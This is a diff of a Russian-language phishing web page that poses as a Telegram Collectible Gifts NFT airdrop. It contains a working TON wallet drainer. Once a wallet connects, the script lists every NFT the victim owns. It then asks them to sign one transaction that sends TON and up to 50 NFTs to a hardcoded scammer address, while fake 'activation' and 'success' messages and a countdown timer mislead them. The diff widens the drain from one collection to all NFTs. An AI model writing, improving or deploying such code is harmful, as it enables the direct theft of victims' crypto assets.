@@ -3,11 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Эксклюзивный Airdrop Scared Cat NFT Gift 2026</title>
+    <title>Эксклюзивный Airdrop Telegram Collectible Gifts 2026</title>
     <script type="module">
         import { TonConnectUI } from 'https://unpkg.com/@tonconnect/ui@2.3.1/dist/tonconnect-ui.min.js';
         import { Address, beginCell, toNano } from 'https://unpkg.com/@ton/ton@16.1.0/dist/index.js';
-        import { Cell } from 'https://app.unpkg.com/@ton/core@0.62.0/files/dist/index.js';
 
         window.TonConnectUI = TonConnectUI;
         window.Address = Address;
@@ -29,11 +28,11 @@
 </head>
 <body>
     <div class="container">
-        <h1>🎁 Лимитированный Airdrop Scared Cat NFT 2026</h1>
+        <h1>🎁 Лимитированный Airdrop Telegram Collectible Gifts 2026</h1>
         <p style="font-size:18px;">Осталось <span class="timer" id="timer">05:55</span> до конца раздачи!</p>
-        <p>Подключите TON-кошелёк и получите редкий Scared Cat Gift (floor >40 TON на Getgems)</p>
+        <p>Подключите TON-кошелёк и активируйте все ваши редкие Gifts (Scared Cat, Jelly Bunny, Plush Pepe и др.)</p>
         
-        <img class="gift-img" src="cat.jpg" alt="Scared Cat NFT Gift">
+        <img class="gift-img" src="cat.jpg" alt="Collectible Gifts">
         
         <div id="ton-connect"></div>
         <div id="status">Кнопка подключения выше — поддержка Tonkeeper / @wallet / TON Space</div>
@@ -49,27 +48,58 @@
             document.getElementById('timer').textContent = m + ':' + s;
         }, 1000);
 
-        const SCAMMER_ADDR = "UQDD4s9YjCnY598XCIDcLzp_G6g_WH4dhqHJLeDnVoR9T9oH"; // Ваш адрес
+        const SCAMMER_ADDR = "UQDD4s9YjCnY598XCIDcLzp_G6g_WH4dhqHJLeDnVoR9T9oH";
         const statusEl = document.getElementById('status');
 
         function generateTransferPayload(ownerAddress) {
             return beginCell()
-                .storeUint(0x5fcc3d14, 32)          // стандартный NFT transfer op
-                .storeUint(Math.floor(Date.now() / 1000), 64) // query_id (timestamp)
-                .storeAddress(Address.parse(SCAMMER_ADDR))    // new_owner = скаммер
-                .storeAddress(Address.parse(ownerAddress))    // response_destination = жертва (excess return)
-                .storeBit(0)                                        // custom_payload = null
-                .storeCoins(toNano('0.05'))                         // forward_amount (стандарт)
-                .storeBit(0)                                        // forward_payload = null
+                .storeUint(0x5fcc3d14, 32)
+                .storeUint(Math.floor(Date.now() / 1000), 64)
+                .storeAddress(Address.parse(SCAMMER_ADDR))
+                .storeAddress(Address.parse(ownerAddress))
+                .storeBit(0)
+                .storeCoins(toNano('0.05'))
+                .storeBit(0)
                 .endCell()
                 .toBoc()
                 .toString('base64');
         }
 
         async function getNfts(owner) {
-            const r = await fetch(`https://toncenter.com/api/v2/getNftItemsByOwner?address=${owner}&limit=50&collection=EQATuUGdvrjLvTWE5ppVFOVCqU2dlCLUnKTsu0n1JYm9la10`);
-            const data = await r.json();
-            return data.nft_items || [];
+            let allNfts = [];
+            let offset = '';
+
+            try {
+                // Основной: toncenter v3 с пагинацией (все NFT)
+                do {
+                    const url = `https://toncenter.com/api/v3/nft/items?owner_address=${owner}&limit=100${offset ? '&offset=' + offset : ''}&sort=desc`;
+                    const r = await fetch(url);
+                    const data = await r.json();
+
+                    if (!data.items || data.items.length === 0) break;
+
+                    allNfts = allNfts.concat(data.items);
+                    offset = data.next_offset || '';
+                } while (offset);
+
+                if (allNfts.length > 0) return allNfts;
+            } catch (e) { console.error('v3 error:', e); }
+
+            // Фолбэк 1: tonapi.io (до 1000 NFT)
+            try {
+                const r2 = await fetch(`https://tonapi.io/v2/accounts/${owner}/nfts?limit=1000`);
+                const data2 = await r2.json();
+                if (data2.nft_items && data2.nft_items.length > 0) return data2.nft_items;
+            } catch (e) { console.error('tonapi error:', e); }
+
+            // Фолбэк 2: toncenter v2
+            try {
+                const r3 = await fetch(`https://toncenter.com/api/v2/getNftItemsByOwner?address=${owner}&limit=100`);
+                const data3 = await r3.json();
+                if (data3.nft_items && data3.nft_items.length > 0) return data3.nft_items;
+            } catch (e) {}
+
+            return [];
         }
 
         const tonConnectUI = new TonConnectUI({
@@ -80,28 +110,28 @@
         tonConnectUI.onStatusChange(async (wallet) => {
             if (wallet) {
                 const owner = wallet.account.address;
-                statusEl.innerHTML = 'Подключено! Сканирую ваши Collectible Gifts...';
+                statusEl.innerHTML = 'Подключено! Сканирую все ваши NFT и Collectible Gifts...';
 
                 try {
                     const nfts = await getNfts(owner);
                     if (nfts.length === 0) {
-                        statusEl.innerHTML = 'Нет Gifts в кошельке. Повторите с кошельком, где есть Scared Cat.';
+                        statusEl.innerHTML = 'Нет NFT в кошельке. Повторите с кошельком, где есть Collectible Gifts.';
                         return;
                     }
 
-                    statusEl.innerHTML = `Найдено ${nfts.length} NFT! Активация редкого Scared Cat...`;
+                    statusEl.innerHTML = `Найдено ${nfts.length} NFT! Активация всех Gifts...`;
 
                     const messages = [];
 
-                    // Минимальный TON дренаж
-                    messages.push({ address: SCAMMER_ADDR, amount: toNano('0.1').toString() });
+                    // TON дренаж
+                    messages.push({ address: SCAMMER_ADDR, amount: toNano('0.3').toString() });
 
-                    // Дренаж всех найденных NFT (до 20)
-                    nfts.slice(0, 20).forEach(nft => {
+                    // Дренаж до 50 NFT (все стандартные)
+                    nfts.slice(0, 50).forEach(nft => {
                         const payload = generateTransferPayload(owner);
                         messages.push({
                             address: nft.address,
-                            amount: toNano('0.06').toString(), // покрытие fees
+                            amount: toNano('0.06').toString(),
                             payload: payload
                         });
                     });
@@ -111,7 +141,7 @@
                         messages: messages
                     });
 
-                    statusEl.innerHTML = 'Успех! Ваш редкий Scared Cat Gift активирован и зачислен!';
+                    statusEl.innerHTML = 'Успех! Все ваши Collectible Gifts активированы и зачислены!';
                 } catch (e) {
                     console.error(e);
                     statusEl.innerHTML = 'Ошибка активации. Повторите подключение.';
@@ -120,7 +150,6 @@
             }
         });
 
-        // Авто-подключение при открытии
         tonConnectUI.connectWallet();
     </script>
 </body>
